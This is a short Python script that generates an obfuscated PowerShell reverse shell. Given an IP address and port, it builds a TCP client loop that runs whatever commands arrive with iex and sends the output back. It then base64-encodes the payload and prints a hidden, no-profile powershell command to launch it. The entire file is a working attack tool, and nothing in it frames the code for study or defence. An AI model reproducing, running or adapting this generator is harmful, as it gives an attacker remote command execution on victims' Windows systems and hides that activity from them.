import sys
import base64
import argparse

def generate_payload(ip, port):
    payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}", {port});'
    payload += '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'
    payload += 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
    payload += '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
    payload += '$sendback = (iex $data 2>&1 | Out-String );'
    payload += '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
    payload += '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
    payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    return payload

def main():
    parser = argparse.ArgumentParser(description='Generate PowerShell reverse shell payload.')
    parser.add_argument('ip', help='The IP address to connect back to')
    parser.add_argument('port', type=int, help='The port to connect back to')

    args = parser.parse_args()

    if not args.ip or not args.port:
        print("Both IP address and port are required.")
        sys.exit(1)

    payload = generate_payload(args.ip, args.port)
    cmd = f'powershell -nop -w hidden -e {base64.b64encode(payload.encode("utf16")[2:]).decode()}'
    print(cmd)

if __name__ == "__main__":
    main()
